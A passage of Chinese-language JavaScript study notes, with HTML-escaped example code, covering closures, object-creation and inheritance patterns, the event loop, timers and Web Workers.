&#125;; console.log(object.getNameFunc()()); // The Window //代码片段二 var name2 = &quot;The Window&quot;; var object2 = &#123; name2: &quot;My Object&quot;, getNameFunc: function () &#123; var that = this; // 这里存了一次this，为object2 return function () &#123; // 这里是闭包 return that.name2; &#125;; &#125; &#125;; console.log(object2.getNameFunc()()); // My Object &lt;/script&gt; 1234567891011121314151617181920212223242526&lt;script type=&quot;text/javascript&quot;&gt; /* 说说它们的输出情况 */ function fun(n, o) &#123; console.log(o) return &#123; fun: function (m) &#123; return fun(m, n) &#125; &#125; &#125; var a = fun(0) a.fun(1) a.fun(2) a.fun(3) //undefined,0，0，0 var b = fun(0).fun(1).fun(2).fun(3) //undefined,0，1，2 var c = fun(0).fun(1) // undefined,0 c.fun(2) c.fun(3) //undefined,1，1 &lt;/script&gt; 37 对象创建模式1234567891011121314151617181920212223242526&lt;body&gt; &lt;!--方式一: Object构造函数模式 * 套路: 先创建空Object对象, 再动态添加属性/方法 * 适用场景: 起始时不确定对象内部数据 * 问题: 语句太多--&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* 一个人: name:&quot;Tom&quot;, age: 12 */ var p = new Object() // p = &#123;&#125; p.name = &#x27;Tom&#x27; p.age = 12 p.setName = function (name) &#123; this.name = name &#125; p.setaAge = function (age) &#123; this.age = age &#125; console.log(p) &lt;/script&gt;&lt;/body&gt; 123456789101112131415161718192021222324252627&lt;!--方式二: 对象字面量模式 * 套路: 使用&#123;&#125;创建对象, 同时指定属性/方法 * 适用场景: 起始时对象内部数据是确定的 * 问题: 如果创建多个对象, 有重复代码--&gt;&lt;script type=&quot;text/javascript&quot;&gt; var p = &#123; name: &#x27;Tom&#x27;, age: 23, setName: function (name) &#123; this.name = name &#125; &#125; console.log(p.name, p.age) p.setName(&#x27;JACK&#x27;) console.log(p.name, p.age) var p2 = &#123; name: &#x27;BOB&#x27;, age: 24, setName: function (name) &#123; this.name = name &#125; &#125;&lt;/script&gt;&lt;/body&gt; 1234567891011121314151617181920212223242526&lt;body&gt;&lt;!--方式三: 工厂模式 * 套路: 通过工厂函数动态创建对象并返回 * 适用场景: 需要创建多个对象 * 问题: 对象没有一个具体的类型, 都是Object类型--&gt;&lt;script type=&quot;text/javascript&quot;&gt; // 工厂函数: 返回一个需要的数据的函数 function createPerson(name, age) &#123; var p = &#123; name: name, age: age, setName: function (name) &#123; this.name = name &#125; &#125; return p &#125; var p1 = createPerson(&#x27;Tom&#x27;, 12) var p2 = createPerson(&#x27;JAck&#x27;, 13) console.log(p1) console.log(p2)&lt;/script&gt;&lt;/body&gt; 12345678910111213141516171819202122&lt;body&gt;&lt;!--方式四: 自定义构造函数模式 * 套路: 自定义构造函数, 通过new创建对象 * 适用场景: 需要创建多个类型确定的对象 * 问题: 每个对象都有相同的数据, 浪费内存 --&gt;&lt;script type=&quot;text/javascript&quot;&gt; function Person(name, age) &#123; this.name = name this.age = age this.setName = function (name) &#123; this.name = name &#125; &#125; var p1 = new Person(&#x27;Tom&#x27;, 12) var p2 = new Person(&#x27;Tom2&#x27;, 13) console.log(p1, p1 instanceof Person)&lt;/script&gt;&lt;/body&gt; 1234567891011121314151617181920212223242526272829303132&lt;body&gt;&lt;!--方式六: 构造函数+原型的组合模式 * 套路: 自定义构造函数, 属性在函数中初始化, 方法添加到原型上 * 适用场景: 需要创建多个类型确定的对象--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function Person (name, age) &#123; this.name = name this.age = age &#125; Person.prototype.setName = function (name) &#123; this.name = name &#125; var p1 = new Person(&#x27;Tom&#x27;, 12) var p2 = new Person(&#x27;JAck&#x27;, 23) p1.setName(&#x27;TOM3&#x27;) console.log(p1) Person.prototype.setAge = function (age) &#123; this.age = age &#125; p1.setAge(23) console.log(p1.age) Person.prototype = &#123;&#125; p1.setAge(34) console.log(p1) var p3 = new Person(&#x27;BOB&#x27;, 12) p3.setAge(12)&lt;/script&gt;&lt;/body&gt; 38 原型链继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;body&gt;&lt;!--方式1: 原型链继承 1. 套路 1. 定义父类型构造函数 2. 给父类型的原型添加方法 3. 定义子类型的构造函数 4. 创建父类型的对象赋值给子类型的原型 5. 将子类型原型的构造属性设置为子类型 6. 给子类型原型添加方法 7. 创建子类型的对象: 可以调用父类型的方法 2. 关键 1. 子类型的原型为父类型的一个实例对象--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function Supper() &#123; //父类型 this.superProp = &#x27;The super prop&#x27; &#125; //原型的数据所有的实例对象都可见 Supper.prototype.showSupperProp = function () &#123; console.log(this.superProp) &#125; function Sub() &#123; //子类型 this.subProp = &#x27;The sub prop&#x27; &#125; // 子类的原型为父类的实例 Sub.prototype = new Supper() // 修正Sub.prototype.constructor为Sub本身 Sub.prototype.constructor = Sub //让子类型原型的constructorzhi Sub.prototype.showSubProp = function () &#123; console.log(this.subProp) &#125; // 创建子类型的实例 var sub = new Sub() // 调用父类型的方法 sub.showSubProp() // 调用子类型的方法 sub.showSupperProp()&lt;/script&gt;&lt;/body&gt; https://www.processon.com/view/link/619e3f107d9c083e98aafa1b 39 组合继承123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;02_借用构造函数继承&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--方式2: 借用构造函数继承(假的)1. 套路: 1. 定义父类型构造函数 2. 定义子类型构造函数 3. 在子类型构造函数中调用父类型构造2. 关键: 1. 在子类型构造函数中通用call()调用父类型构造函数--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Person(name, age) &#123; this.name = name this.age = age &#125; function Student(name, age, price) &#123; Person.call(this, name, age) // this.Person(name, age) this.price = price &#125; var s = new Student(&#x27;Tom&#x27;, 20, 12000) console.log(s.name, s.age, s.price) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334&lt;body&gt;&lt;!--方式3: 原型链+借用构造函数的组合继承1. 利用原型链实现对父类型对象的方法继承2. 利用call()借用父类型构建函数初始化相同属性--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function Person(name, age) &#123; this.name = name this.age = age &#125; Person.prototype.setName = function (name) &#123; this.name = name &#125; function Student(name, age, price) &#123; Person.call(this, name, age) //得到父类型的属性 this.price = price &#125; Student.prototype = new Person() //得到父类型的方法 Student.prototype.constructor = Student Student.prototype.setPrice = function (price) &#123; this.price = price &#125; var s = new Student(&#x27;Tom&#x27;, 12, 10000) s.setPrice(11000) s.setName(&#x27;Bob&#x27;) console.log(s) console.log(s.constructor)&lt;/script&gt;&lt;/body&gt; 40 复习new一个对象背后做了什么？ 创建一个空对象 给对象设置__proto__，值为构造函数对象的prototype属性值，this.__proto__ = this.prototype 执行构造函数体（给对象添加属性和方法） 42 进程与线程1.进程：程序的一次执行, 它占有一片独有的内存空间 2.线程： CPU的基本调度单位, 是程序执行的一个完整流程 3.进程与线程 一个进程中一般至少有一个运行的线程: 主线程 一个进程中也可以同时运行多个线程, 我们会说程序是多线程运行的 一个进程内的数据可以供其中的多个线程直接共享 多个进程之间的数据是不能直接共享的 4.浏览器运行是单进程还是多进程? 有的是单进程 firefox 老版IE 有的是多进程 chrome 新版IE 5.如何查看浏览器是否是多进程运行的呢? 任务管理器==&gt;进程 6.浏览器运行是单线程还是多线程? 都是多线程运行的 7.JS是单线程还是多线程? js是单线程运行的 但使用H5中的 Web Workers可以多线程运行 43 浏览器内核 什么是浏览器内核? 支持浏览器运行的最核心的程序 不同的浏览器可能不太一样 Chrome, Safari: webkit firefox: Gecko IE: Trident 360,搜狗等国内浏览器: Trident + webkit 内核由很多模块组成 主线程 html,css文档解析模块 : 负责页面文本的解析 dom/css模块 : 负责dom/css在内存中的相关处理 布局和渲染模块 : 负责页面的布局和效果的绘制 分线程 定时器模块 : 负责定时器的管理 网络请求模块 : 负责服务器请求(常规/Ajax) 事件响应模块 : 负责事件的管理 44 定时器思考1234567891011121314151617181920212223242526272829&lt;body&gt;&lt;button id=&quot;btn&quot;&gt;启动定时器&lt;/button&gt;&lt;!--1. 定时器真是定时执行的吗? * 定时器并不能保证真正定时执行 * 一般会延迟一丁点(可以接受), 也有可能延迟很长时间(不能接受)2. 定时器回调函数是在分线程执行的吗? * 在主线程执行的, js是单线程的3. 定时器是如何实现的? * 事件循环模型(后面讲)--&gt;&lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&#x27;btn&#x27;).onclick = function () &#123; var start = Date.now() console.log(&#x27;启动定时器&#x27;) setTimeout(function () &#123; console.log(&#x27;定时器执行了: &#x27;, Date.now()-start) &#125;, 100) //定时器启动之后做一个长时间的工作 for (var i = 0; i &lt; 1000000000; i++) &#123; &#125; console.log(&#x27;完成长时间工作&#x27;, Date.now()-start) &#125;&lt;/script&gt;&lt;/body&gt; 45 JS是单线程执行的123456789101112131415161718192021222324252627282930313233343536373839404142&lt;body&gt; &lt;!--1. 如何证明js执行是单线程的? * setTimeout()的回调函数是在主线程执行的 * 定时器回调函数只有在运行栈中的代码全部执行完后才有可能执行2. 为什么js要用单线程模式, 而不用多线程模式? * JavaScript的单线程，与它的用途有关。 * 作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。 * 这决定了它只能是单线程，否则会带来很复杂的同步问题3. 代码的分类: * 初始化代码 * 回调代码4. js引擎执行代码的基本流程 * 先执行初始化代码: 包含一些特别的代码 * 设置定时器 * 绑定监听 * 发送ajax请求 * 后面在某个时刻才会执行回调代码--&gt; &lt;script type=&quot;text/javascript&quot;&gt; setTimeout(function () &#123; console.log(&#x27;timeout 3&#x27;) alert(&#x27;3333&#x27;) &#125;, 3000) setTimeout(function () &#123; console.log(&#x27;timeout 2&#x27;) alert(&#x27;2222&#x27;) &#125;, 2000) setTimeout(function () &#123; console.log(&#x27;timeout 0&#x27;) alert(&#x27;0000&#x27;) &#125;, 0) console.log(&#x27;alert之前&#x27;) // 最先输出，因为等所有主线程的任务执行完毕,再看异步任务,异步任务可以执行的情况下就丢去主线程执行了（先执行同步代码 ，再执行回调代码） alert(&#x27;提示...&#x27;) // 暂停当前主线程的执行，（同时暂停了计时器，点击确定后恢复程序执行和计时），2021年，EDGE浏览器中定时器不再会被暂停计时了 console.log(&#x27;alert之后&#x27;) &lt;/script&gt;&lt;/body&gt; 46 事件循环模型 事件轮询：从任务队列中循环取出回调函数放入执行栈中处理(一个接一个) 12345678910111213141516171819202122232425262728293031323334353637&lt;body&gt;&lt;button id=&quot;btn&quot;&gt;测试&lt;/button&gt;&lt;!--1. 所有代码分类 * 初始化执行代码(同步代码): 包含绑定dom事件监听, 设置定时器, 发送ajax请求的代码 * 回调执行代码(异步代码): 处理回调逻辑2. js引擎执行代码的基本流程: * 初始化代码===&gt;回调代码3. 模型的2个重要组成部分: * 事件管理模块 * 回调队列4. 模型的运转流程 * 执行初始化代码, 将事件回调函数交给对应模块管理 * 当事件发生时, 管理模块会将回调函数及其数据添加到回调列队中 * 只有当初始化代码执行完后(可能要一定时间), 才会遍历读取回调队列中的回调函数执行--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function fn1() &#123; console.log(&#x27;fn1()&#x27;) &#125; fn1() document.getElementById(&#x27;btn&#x27;).onclick = function () &#123; console.log(&#x27;处理点击事件&#x27;) &#125; setTimeout(function () &#123; console.log(&#x27;到点了&#x27;) &#125;, 2000) function fn2() &#123; console.log(&#x27;fn2()&#x27;) &#125; fn2()&lt;/script&gt;&lt;/body&gt; 47 Web Workers多线程 js是单线程的，但是浏览器是多线程的，js碰到异步任务，并没有自己处理，而是交给了浏览器的其他线程。 Web Workers 是 HTML5 提供的一个javascript多线程解决方案 我们可以将一些大计算量的代码交由web Worker运行而不冻结用户界面 但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质 使用： 创建在分线程执行的js文件 在主线程中的js中发消息并设置回调 缺点： 慢 不能跨域加载JS worker内代码不能访问DOM(更新UI) 不是每个浏览器都支持这个新特性 H5规范提供了js分线程的实现, 取名为: Web Workers 相关API Worker: 构造函数, 加载分线程执行的js文件 Worker.prototype.onmessage: 用于接收另一个线程的回调函数 Worker.prototype.postMessage: 向另一个线程发送消息 work.js 12345678910111213141516171819function fibonacci(n) &#123; return n &lt;= 2 ? 1 : fibonacci(n - 1) + fibonacci(n - 2);&#125;console.log(this);var onmessage = function (event) &#123; var number = event.data; console.log(&quot;分线程接受主线程发送的数据&quot; + number); //计算 var result = fibonacci(number); postMessage(result); console.log(&quot;分线程向主线程返回数据：&quot; + result); // alert(result) /* alert是window的方法，在分线程是不能调用的 分线程中的全局对象不再是window，所以分线程中不可能更新界面 */&#125; 12345678910111213141516171819202122&lt;body&gt; &lt;input type=&quot;text&quot; placeholder=&quot;数值&quot; id=&quot;number&quot;&gt; &lt;button id=&quot;btn&quot;&gt;计算&lt;/button&gt; &lt;script&gt; var input = document.getElementById(&quot;number&quot;) document.getElementById(&quot;btn&quot;).onclick = function () &#123; var number = input.value; // 创建一个Worker对象 var worker = new Worker(&#x27;work.js&#x27;) // 绑定接受消息的监听 worker.onmessage = function (event) &#123; console.log(&#x27;主线程接收分线程返回的数据：&#x27; + event.data) alert(event.data) &#125; // 先分线程发送消息 worker.postMessage(number) console.log(&#x27;主线程向分线程发送数据：&#x27; + number) &#125; &lt;/script&gt;&lt;/body&gt; JS高级Xmind基础总结深入数据类型 分类(2大类) 基本(值)类型 Number: 任意数值 String: 任意文本 Boolean: true/false undefined: undefined null: null 对象(引用)类型 Object: 一般对象类型 Array: 特别的对象类型(下标/内部数据有序) Function: 特别的对象类型(可执行) 判断 typeof: 可以区别: 数值, 字符串, 布尔值, undefined, function 不能区别: null与对象, 一般对象与数组 instanceof 专门用来判断对象数据的类型: Object, Array与Function === 可以判断: undefined和null 分类 判断 相关问题 undefined与null的区别? undefined代表变量没有赋值 null: 代表变量赋值了, 只是值为null 什么时候将变量赋值为null? 初始化赋值: 将要作为引用变量使用, 但对象还没有确定 结束时: 将变量指向的对象成为垃圾对象 理解变量类型与数据类型? js的变量本身是没有类型的, 变量的类型实际上是变量内存中数据的类型 变量类型: 基本类型: 保存基本类型数据的变量 引用类型: 保存对象地址值的变量 数据对象 基本类型 对象类型 undefined与null的区别? 什么时候将变量赋值为null? 严格区别变量类型与数据类型? 数据, 变量与内存 什么是数据? 存储于内存中代表特定信息的’东东’, 本质就是0101二进制 具有可读和可传递的基本特性 万物(一切)皆数据, 函数也是数据 程序中所有操作的目标: 数据 算术运算 逻辑运算 赋值 调用函数传参 … 什么是内存? 内存条通电后产生的存储空间(临时的) 产生和死亡: 内存条(集成电路板)==&gt;通电==&gt;产生一定容量的存储空间==&gt;存储各种数据==&gt;断电==&gt;内存全部消失 内存的空间是临时的, 而硬盘的空间是持久的 分配内存: 声明变量和函数或创建对象时, JS引擎会自动为此分配一定大小的内存来存放对应的数据 释放内存: 清空内存中的数据, 标识内存可以再分配使用(内存不释放就不能复用) 自动释放: 栈空间的局部变量 垃圾回调器回调: 堆空间的垃圾对象 一块内存包含2个数据 内部存储的数据(一般数据/地址数据) 内存地址值数据 内存分类 栈: 全局变量, 局部变量 (空间较小) 堆: 对象 (空间较大) 什么是变量? 值可以变化的量, 由变量名与变量值组成 一个变量对应一块小内存, 变量名用来查找到内存, 变量值就是内存中保存的内容 内存,数据, 变量三者之间的关系 内存是一个容器, 用来存储程序运行需要操作的数据 变量是内存的标识, 我们通过变量找到对应的内存, 进而操作(读/写)内存中的数据 什么是数据? 什么是内存? 什么是变量? 内存,数据, 变量三者之间的关系 相关问题 问题1: var a = xxx, a内存中到底保存的是什么? xxx是一个基本数据 xxx是一个对象 xxx是一个变量 关于引用变量赋值问题 2个引用变量指向同一个对象, 通过一个引用变量修改对象内部数据, 另一个引用变量也看得见 2个引用变量指向同一个对象,让一个引用变量指向另一个对象, 另一个引用变量还是指向原来的对象 问题: 在js调用函数时传递变量参数时, 是值传递还是引用传递? 只有值传递, 没有引用传递, 传递的都是变量的值, 只是这个值可能是基本数据, 也可能是地址(引用)数据 如果后一种看成是引用传递, 那就值传递和引用传递都可以有 问题: JS引擎如何管理内存? 内存生命周期 1). 分配需要的内存 2). 使用分配到的内存 3). 不需要时将其释放/归还 释放内存 为执行函数分配的栈空间内存: 函数执行完自动释放 存储对象的堆空间内存: 当内存没有引用指向时, 对象成为垃圾对象, 垃圾回收器后面就会回收释放此内存 关于赋值与内存的问题? 关于引用变量赋值问题? 关于数据传递问题? JS引擎如何管理内存? 对象 什么是对象? 代表现实中的某个事物, 是该事物在编程中的抽象 多个数据的集合体(封装体) 用于保存多个数据的容器 为什么要用对象? 便于对多个数据进行统一管理 对象的组成 属性 代表现实事物的状态数据 由属性名和属性值组成 属性名都是字符串类型, 属性值是任意类型 方法 代表现实事物的行为数据 是特别的属性==&gt;属性值是函数 如何访问对象内部数据? .属性名: 编码简单, 但有时不能用 [‘属性名’]: 编码麻烦, 但通用 什么是对象? 为什么要用对象? 对象的组成 如何访问对象内部数据? 相关问题 什么时候必须使用[‘属性名’]的方式访问对象内部数据? 属性名不是合法的标识名 属性名不确定 什么时候必须使用[‘属性名’]的方式? 函数 什么是函数? 具有特定功能的n条语句的封装体 只有函数是可执行的, 其它类型的数据是不可执行的 函数也是对象 为什么要用函数? 提高代码复用 便于阅读和交流 如何定义函数? 函数声明 表达式 调用(执行)函数 test() new test() obj.test() test.call/apply(obj) 什么是函数? 为什么要用函数? 如何定义函数? 如何调用(执行)函数? 回调函数 什么函数才是回调函数? 你定义的 你没有直接调用 但最终它执行了(在特定条件或时刻) 常见的回调函数? DOM事件函数 定时器函数 ajax回调函数(后面学) 生命周期回调函数(后面学) 什么函数才是回调函数? 常见的回调函数? IIEF 理解 全称: Immediately-Invoked Function Expression 立即调用函数表达式 别名: 匿名函数自调用 作用 隐藏内部实现 不污染外部命名空间 理解 作用 函数中的this function Person(color) { // console.log(this) this.color = color; this.getColor = function () { // console.log(this) return this.color; }; this.setColor = function (color) { // console.log(this) this.color = color; }; } Person(“red”); //this是谁? var p = new Person(“yello”); //this是谁? p.getColor(); //this是谁? var obj = {}; p.setColor.call(obj, “black”); //this是谁? var test = p.setColor; test(); //this是谁? function fun1() { function fun2() { console.log(this); } fun2(); //this是谁? } fun1(); 函数高级原型与原型链 原型(prototype) 函数的prototype属性(图) 每个函数都有一个prototype属性, 它默认指向一个Object空对象(即称为: 原型对象) 原型对象中有一个属性constructor, 它指向函数对象 给原型对象添加属性(一般都是方法) 作用: 函数的所有实例对象自动拥有原型中的属性(方法) 函数的protype属性 给原型对象添加属性(一般都是方法) 显式原型与隐式原型 每个函数function都有一个prototype，即显式原型 每个实例对象都有一个__proto__，可称为隐式原型 对象的隐式原型的值为其对应构造函数的显式原型的值 内存结构(图) 总结: 函数的prototype属性: 在定义函数时自动添加的, 默认值是一个空Object对象 对象的__proto__属性: 创建对象时自动添加的, 默认值为构造函数的prototype属性值 程序员能直接操作显式原型, 但不能直接操作隐式原型(ES6之前) 原型链 原型链 原型链(图解) 访问一个对象的属性时， 先在自身属性中查找，找到返回 如果没有, 再沿着__proto__这条链向上查找, 找到返回 如果最终没找到, 返回undefined 别名: 隐式原型链 作用: 查找对象的属性(方法) 构造函数/原型/实体对象的关系(图解) 构造函数/原型/实体对象的关系2(图解) 构造函数/原型/实例对象的关系(图解) var o1 = new Object();var o2 = {}; 构造函数/原型/实例对象的关系2(图解) function Foo(){ } 原型继承 构造函数的实例对象自动拥有构造函数原型对象的属性(方法) 利用的就是原型链 原型属性问题 读取对象的属性值时: 会自动到原型链中查找 设置对象的属性值时: 不会查找原型链, 如果当前对象中没有此属性, 直接添加此属性并设置其值 方法一般定义在原型中, 属性一般通过构造函数定义在对象本身上 探索instanceof instanceof是如何判断的? 表达式: A instanceof B 如果B函数的显式原型对象在A对象的原型链上, 返回true, 否则返回false Function是通过new自己产生的实例 案例1 function Foo() { }var f1 = new Foo();console.log(f1 instanceof Foo);console.log(f1 instanceof Object); 案例2 console.log(Object instanceof Function);console.log(Object instanceof Object);console.log(Function instanceof Function);console.log(Function instanceof Object); function Foo() {}console.log(Object instanceof Foo); 面试题 /* 测试题1 */ var A = function() { } A.prototype.n = 1 var b = new A() A.prototype = { n: 2, m: 3 } var c = new A() console.log(b.n, b.m, c.n, c.m) /* 测试题2 */ var F = function(){}; Object.prototype.a = function(){ console.log(&#39;a()&#39;) }; Function.prototype.b = function(){ console.log(&#39;b()&#39;) }; var f = new F(); f.a() f.b() F.a() F.b() 执行上下文与执行上下文栈 变量提升与函数提升 变量声明提升 通过var定义(声明)的变量, 在定义语句之前就可以访问到 值: undefined 函数声明提升 通过function声明的函数, 在之前就可以直接调用 值: 函数定义(对象) 问题: 变量提升和函数提升是如何产生的? 执行上下文 代码分类(位置) 全局代码 函数代码 全局执行上下文 在执行全局代码前将window确定为全局执行上下文 对全局数据进行预处理 var定义的全局变量==&gt;undefined, 添加为window的属性 function声明的全局函数==&gt;赋值(fun), 添加为window的方法 this==&gt;赋值(window) 开始执行全局代码 函数执行上下文 在调用函数, 准备执行函数体之前, 创建对应的函数执行上下文对象 对局部数据进行预处理 形参变量==&gt;赋值(实参)==&gt;添加为执行上下文的属性 arguments==&gt;赋值(实参列表), 添加为执行上下文的属性 var定义的局部变量==&gt;undefined, 添加为执行上下文的属性 function声明的函数 ==&gt;赋值(fun), 添加为执行上下文的方法 this==&gt;赋值(调用函数的对象) 开始执行函数体代码 代码分类(位置) 全局执行上下文 函数执行上下文 执行上下文栈 理解 在全局代码执行前, JS引擎就会创建一个栈来存储管理所有的执行上下文对象 在全局执行上下文(window)确定后, 将其添加到栈中(压栈) 在函数执行上下文创建后, 将其添加到栈中(压栈) 在当前函数执行完后,将栈顶的对象移除(出栈) 当所有的代码执行完后, 栈中只剩下window 流程分析 var a = 10 var bar = function (x) { var b = 5 foo(x + b) } var foo = function (y) { var c = 5 console.log(a + c + y) } bar(10) 面试题 /* 测试题1: */ function a() {} var a; console.log(typeof a) /* 测试题2: */ if (!(b in window)) { var b = 1; } console.log(b) /* 测试题3: */ var c = 1 function c(c) &#123; console.log(c) var c = 3 &#125; c(2) 作用域与作用域链 作用域 理解 就是一块”地盘”, 一个代码段所在的区域 它是静态的(相对于上下文对象), 在编写代码时就确定了 分类 全局作用域 函数作用域 没有块作用域(ES6有了) 作用 隔离变量，不同作用域下同名变量不会有冲突 作用域与执行上下文 区别1 全局作用域之外，每个函数都会创建自己的作用域，作用域在函数定义时就已经确定了。而不是在函数调用时 全局执行上下文环境是在全局作用域确定之后, js代码马上执行之前创建 函数执行上下文环境是在调用函数时, 函数体代码执行之前创建 区别2 作用域是静态的, 只要函数定义好了就一直存在, 且不会再变化 上下文环境是动态的, 调用函数时创建, 函数调用结束时上下文环境就会被释放 联系 上下文环境(对象)是从属于所在的作用域 全局上下文环境==&gt;全局作用域 函数上下文环境==&gt;对应的函数使用域 作用域链 理解 多个上下级关系的作用域形成的链, 它的方向是从下向上的(从内到外) 查找变量时就是沿着作用域链来查找的 查找一个变量的查找规则 在当前作用域下的执行上下文中查找对应的属性, 如果有直接返回, 否则进入2 在上一级作用域的执行上下文中查找对应的属性, 如果有直接返回, 否则进入3 再次执行2的相同操作, 直到全局作用域, 如果还找不到就抛出找不到的异常 var a = 2; function fn1() &#123; var b = 3; function fn2() &#123; var c = 4; console.log(c); console.log(b); console.log(a); console.log(d); &#125; fn2(); &#125; fn1(); 面试题 面试题1 var x = 10; function fn() { console.log(x); } function show(f) { var x = 20; f(); } show(fn); 面试题2 var fn = function () { console.log(fn) } fn() var obj = { fn2: function () &#123; console.log(fn2) &#125; } obj.fn2() 闭包 引子实例 &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* 需求: 点击某个按钮, 提示”点击的是第n个按钮” */ &lt;/script&gt; &lt;button&gt;测试1&lt;/button&gt; &lt;button&gt;测试2&lt;/button&gt; &lt;button&gt;测试3&lt;/button&gt; 理解闭包 如何产生闭包? 当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量(函数)时, 就产生了闭包 闭包到底是什么? 使用chrome调试查看 理解一: 闭包是嵌套的内部函数(绝大部分人) 理解二: 包含被引用变量(函数)的对象(极少数人) 注意: 闭包存在于嵌套的内部函数中 产生闭包的条件? 函数嵌套 内部函数引用了外部函数的数据(变量/函数) 常见的闭包 将函数作为另一个函数的返回值 将函数作为实参传递给另一个函数调用 闭包的作用 使用函数内部的变量在函数执行完后, 仍然存活在内存中(延长了局部变量的生命周期) 让函数外部可以操作(读写)到函数内部的数据(变量/函数) 问题: 1. 函数执行完后, 函数内部声明的局部变量是否还存在? 2. 在函数外部能直接访问函数内部的局部变量吗? 闭包的生命周期 产生: 在嵌套内部函数定义执行完时就产生了(不是在调用) 死亡: 在嵌套的内部函数成为垃圾对象时 function fun1() &#123; //问题2: 此时闭包产生了吗? var a = 3; function fun2() &#123; a++; console.log(a); &#125; return fun2; &#125; //问题1: 此时闭包产生了吗? var f = fun1(); //问题3: 此时闭包释放了吗? f(); f(); //问题4: 此时闭包释放回收了吗? //问题5: 如何让闭包释放回收呢? 闭包的应用: 自定义JS模块 闭包的应用 : 定义JS模块 具有特定功能的js文件 将所有的数据和功能都封装在一个函数内部(私有的) 只向外暴露一个包信n个方法的对象或函数 模块的使用者, 只需要通过模块暴露的对象调用方法来实现对应的功能 闭包的缺点及解决 缺点 函数执行完后, 函数内的局部变量没有释放, 占用内存时间会变长 容易造成内存泄露 解决 能不用闭包就不用 及时释放 面试题 面试题一 //代码片段一 var name = “The Window”; var object = { name : &quot;My Object&quot;,getNameFunc : function()&#123; return function()&#123; return this.name; &#125;;&#125; }; alert(object.getNameFunc()()); //? //代码片段二 var name2 = “The Window”; var object2 = { name2 : &quot;My Object&quot;,getNameFunc : function()&#123; var that = this; return function()&#123; return that.name2; &#125;;&#125; }; alert(object2.getNameFunc()()); //? 面试题二 function fun(n,o) { console.log(o) return &#123; fun:function(m)&#123; return fun(m,n); &#125; &#125;; } var a = fun(0); a.fun(1); a.fun(2); a.fun(3);//undefined,?,?,? var b = fun(0).fun(1).fun(2).fun(3);//undefined,?,?,? var c = fun(0).fun(1); c.fun(2); c.fun(3);//undefined,?,?,? 面向对象高级对象创建模式 Object构造函数模式 方式1: Object构造函数模式 套路: 先创建空Object对象, 再动态添加属性/方法 适用场景: 起始时不确定对象内部数据 问题: 语句太多 对象字面量模式 方式2: 对象字面量模式 套路: 使用{}创建对象, 同时指定属性/方法 适用场景: 起始时对象内部数据是确定的 问题: 如果创建多个对象, 有重复代码 工厂模式 方式3: 工厂模式 套路: 通过工厂函数动态创建对象并返回 适用场景: 需要创建多个对象 问题: 对象没有一个具体的类型, 都是Object类型 自定义构造函数模式 方式4: 自定义构造函数模式 套路: 自定义构造函数, 通过new创建对象 适用场景: 需要创建多个类型确定的对象 问题: 每个对象都有相同的数据, 浪费内存 构造函数+原型的组合模式 方式5: 构造函数+原型的组合模式 套路: 自定义构造函数, 属性在函数中初始化, 方法添加到原型上 适用场景: 需要创建多个类型确定的对象 继承模式 原型链继承 方式1: 原型链继承 1. 套路 1. 定义父类型构造函数 2. 给父类型的原型添加方法 3. 定义子类型的构造函数 4. 创建父类型的对象赋值给子类型的原型 5. 将子类型原型的构造属性设置为子类型 6. 给子类型原型添加方法 7. 创建子类型的对象: 可以调用父类型的方法 2. 关键 1. 子类型的原型为父类型的一个实例对象 借用构造函数继承 方式2: 借用构造函数继承(假的) 套路: 定义父类型构造函数 定义子类型构造函数 在子类型构造函数中调用父类型构造 关键: 在子类型构造函数中通用super()调用父类型构造函数 组合继承 方式3: 原型链+借用构造函数的组合继承 利用原型链实现对父类型对象的方法继承 利用super()借用父类型构建函数初始化相同属性 线程机制与事件机制进程与线程 进程(process) 程序的一次执行, 它占有一片独有的内存空间 可以通过windows任务管理器查看进程 线程(thread) 是进程内的一个独立执行单元 是程序执行的一个完整流程 是CPU的最小的调度单元 图解 相关知识 应用程序必须运行在某个进程的某个线程上 一个进程中至少有一个运行的线程: 主线程, 进程启动后自动创建 一个进程中也可以同时运行多个线程, 我们会说程序是多线程运行的 一个进程内的数据可以供其中的多个线程直接共享 多个进程之间的数据是不能直接共享的 线程池(thread pool): 保存多个线程对象的容器, 实现线程对象的反复利用 相关问题 何为多进程与多线程? 多进程运行: 一应用程序可以同时启动多个实例运行 多线程: 在一个进程内, 同时有多个线程运行 比较单线程与多线程? 多线程 优点 能有效提升CPU的利用率 缺点 创建多线程开销 线程间切换开销 死锁与状态同步问题 单线程 优点 顺序编程简单易懂 缺点 效率低 JS是单线程还是多线程? js是单线程运行的 但使用H5中的 Web Workers可以多线程运行 浏览器运行是单线程还是多线程? 都是多线程运行的 浏览器运行是单进程还是多进程? 有的是单进程 firefox 老版IE 有的是多进程 chrome 新版IE 如何查看浏览器是否是多进程运行的呢? 任务管理器–&gt;进程 浏览器内核 支撑浏览器运行的最核心的程序 不同的浏览器可能不一样 Chrome, Safari : webkit firefox : Gecko IE : Trident 360,搜狗等国内浏览器: Trident + webkit 内核由很多模块组成 js引擎模块 : 负责js程序的编译与运行 html,css文档解析模块 : 负责页面文本的解析 DOM/CSS模块 : 负责dom/css在内存中的相关处理 布局和渲染模块 : 负责页面的布局和效果的绘制(内存中的对象) …… 定时器模块 : 负责定时器的管理 DOM事件响应模块 : 负责事件的管理 网络请求模块 : 负责ajax请求 定时器引发的思考 定时器真是定时执行的吗? 定时器并不能保证真正定时执行 一般会延迟一丁点(可以接受), 也有可能延迟很长时间(不能接受) 